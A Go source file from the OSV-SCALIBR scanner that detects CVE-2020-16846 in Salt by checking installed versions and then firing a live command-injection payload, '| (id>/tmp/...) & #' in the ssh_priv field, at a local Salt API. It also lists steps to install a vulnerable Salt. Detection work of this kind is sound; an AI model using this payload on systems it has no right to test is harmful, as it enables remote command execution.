// Copyright 2025 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

// Package cve202016846 implements a detector for CVE-2020-16846.
// To test this detector locally, run the following commands:
// To install a vulnerable version of Salt, run the following commands as root:
// python3 -m venv salt_env; source salt_env/bin/activate;
// pip install salt==3002; pip install jinja2==3.0.1
//
// Once installed, run salt-master -d && salt-api -d
//
// If the proposed method above doesn't work, using the steps in
// https://github.com/zomy22/CVE-2020-16846-Saltstack-Salt-API
// might be more stable.
// However, make sure to add the line "RUN pip install jinja2==3.0.1"
// before the ENTRYPOINT line in the Dockerfile.
package cve202016846

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io/fs"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/google/osv-scalibr/detector"
	"github.com/google/osv-scalibr/extractor"
	"github.com/google/osv-scalibr/extractor/filesystem/language/python/wheelegg"
	scalibrfs "github.com/google/osv-scalibr/fs"
	"github.com/google/osv-scalibr/inventoryindex"
	"github.com/google/osv-scalibr/log"
	"github.com/google/osv-scalibr/plugin"
)

type saltPackageNames struct {
	packageType      string
	name             string
	affectedVersions []string
}

const (
	// Name of the detector.
	Name = "cve/cve-2020-16846"

	saltServerPort = 8000
	defaultTimeout = 5 * time.Second
	saltServerIP   = "127.0.0.1"
)

var (
	seededRand   = rand.New(rand.NewSource(time.Now().UnixNano()))
	randFilePath = "/tmp/" + randomString(16)
	saltPackages = []saltPackageNames{
		{
			packageType: "pypi",
			name:        "salt",
			affectedVersions: []string{
				"2015.8.10",
				"2015.8.13",
				"2016.3.4",
				"2016.3.6",
				"2016.3.8",
				"2016.11.3",
				"2016.11.6",
				"2016.11.10",
				"2017.7.4",
				"2017.7.8",
				"2018.3.5",
				"2019.2.5",
				"2019.2.6",
				"3000.3",
				"3000.4",
				"3001.1",
				"3001.2",
				"3002",
			},
		},
	}
)

// Detector is a SCALIBR Detector for CVE-2020-16846.
type Detector struct{}

// New returns a detector.
func New() detector.Detector {
	return &Detector{}
}

// Name of the detector.
func (Detector) Name() string { return Name }

// Version of the detector.
func (Detector) Version() int { return 0 }

// Requirements of the detector.
func (Detector) Requirements() *plugin.Capabilities {
	return &plugin.Capabilities{DirectFS: true, RunningSystem: true, OS: plugin.OSLinux}
}

// RequiredExtractors returns an empty list as there are no dependencies.
func (Detector) RequiredExtractors() []string { return []string{wheelegg.Name} }

func findSaltVersions(ix *inventoryindex.InventoryIndex) (string, *extractor.Inventory, []string) {
	for _, r := range saltPackages {
		inventory := ix.GetSpecific(r.name, r.packageType)
		for _, i := range inventory {
			return i.Version, i, r.affectedVersions
		}
	}
	return "", nil, []string{}
}

// Scan checks for the presence of the Salt CVE-2020-16846 vulnerability on the filesystem.
func (d Detector) Scan(ctx context.Context, scanRoot *scalibrfs.ScanRoot, ix *inventoryindex.InventoryIndex) ([]*detector.Finding, error) {
	saltVersion, inventory, affectedVersions := findSaltVersions(ix)
	if saltVersion == "" {
		log.Debugf("No Salt version found")
		return nil, nil
	}
	isVulnVersion := false
	for _, r := range affectedVersions {
		if strings.Contains(saltVersion, r) {
			isVulnVersion = true
		}
	}

	if !isVulnVersion {
		log.Infof("Version %q not vuln", saltVersion)
		return nil, nil
	}

	log.Infof("Found Potentially vulnerable Salt version %v", saltVersion)

	if !CheckForCherrypy(saltServerIP, saltServerPort) {
		log.Infof("Cherry py not found. Version %q not vulnerable", saltVersion)
		return nil, nil
	}

	if !ExploitSalt(ctx, saltServerIP, saltServerPort) {
		log.Infof("Version %q not vulnerable", saltVersion)
		return nil, nil
	}

	log.Infof("Exploit successful")

	if !fileExists(scanRoot.FS, randFilePath) {
		return nil, nil
	}

	log.Infof("Version %q is vulnerable", saltVersion)

	err := os.Remove(randFilePath)
	if err != nil {
		log.Infof("Error removing file: %v", err)
	}

	return []*detector.Finding{{
		Adv: &detector.Advisory{
			ID: &detector.AdvisoryID{
				Publisher: "SCALIBR",
				Reference: "CVE-2020-16846",
			},
			Type:           detector.TypeVulnerability,
			Title:          "CVE-2020-16846",
			Description:    "CVE-2020-16846",
			Recommendation: "Update salt to version 3002.1 or later",
			Sev:            &detector.Severity{Severity: detector.SeverityCritical},
		},
		Target: &detector.TargetDetails{
			Inventory: inventory,
		},
		Extra: fmt.Sprintf("%s %s %s", inventory.Name, inventory.Version, strings.Join(inventory.Locations, ", ")),
	}}, nil
}

// CheckForCherrypy checks for the presence of Cherrypy in the server headers.
func CheckForCherrypy(saltIP string, saltServerPort int) bool {
	target := fmt.Sprintf("http://%s", net.JoinHostPort(saltIP, strconv.Itoa(saltServerPort)))

	client := &http.Client{Timeout: defaultTimeout}
	resp, err := client.Get(target)
	if err != nil {
		log.Infof("Request failed: %v", err)
		return false
	}
	defer resp.Body.Close()

	serverHeader := resp.Header.Get("Server")
	return strings.Contains(serverHeader, "CherryPy")
}

// ExploitSalt attempts to exploit the Salt server if vulnerable.
func ExploitSalt(ctx context.Context, saltIP string, saltServerPort int) bool {
	target := fmt.Sprintf("http://%s/run", net.JoinHostPort(saltIP, strconv.Itoa(saltServerPort)))
	data := map[string]any{
		"client":   "ssh",
		"tgt":      "*",
		"fun":      "B",
		"eauth":    "C",
		"ssh_priv": fmt.Sprintf("| (id>/tmp/%s) & #", randFilePath),
	}

	jsonData, err := json.Marshal(data)
	if err != nil {
		log.Infof("Error marshaling JSON:", err)
		return false
	}
	ctx, cancel := context.WithTimeout(ctx, defaultTimeout)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, target, bytes.NewBuffer(jsonData))
	if err != nil {
		log.Infof("Error creating request: %v\n", err)
		return false
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		if errors.Is(err, context.DeadlineExceeded) {
			log.Infof("Request needs to timeout. POST request hangs up otherwise")
			return true
		}
		log.Infof("Error sending request: %v\n", err)
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		log.Infof("Unexpected status code: %d\n", resp.StatusCode)
		return false
	}

	return true
}

func fileExists(filesys scalibrfs.FS, path string) bool {
	_, err := fs.Stat(filesys, path)
	return !os.IsNotExist(err)
}

func randomString(length int) string {
	charSet := "aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ"
	b := make([]byte, length)
	for i := range b {
		b[i] = charSet[seededRand.Intn(len(charSet)-1)]
	}
	return string(b)
}
